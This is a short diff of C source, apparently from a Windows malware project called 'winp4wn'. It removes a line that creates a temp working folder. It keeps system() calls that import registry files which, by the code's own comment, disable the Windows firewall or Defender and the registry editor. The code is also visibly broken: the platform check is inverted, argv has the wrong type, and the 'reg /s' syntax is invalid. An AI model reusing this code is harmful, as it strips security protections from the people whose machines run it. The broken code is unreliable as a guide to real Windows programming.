@@ -5,8 +5,6 @@
 void getos(int argc, char** argv[]) {
 #ifndef __WIN32__
 #define OS __WIN32__
-  /** move into c:/temp for local instance */
-  system("cd %Temp% && mkdir winp4wn && cd winp4wn");
   /** disable some stuff like winfirewall and regedit */
   system("reg /s registries/disabledef.reg");
   system("reg /s registries/disablereg.reg");
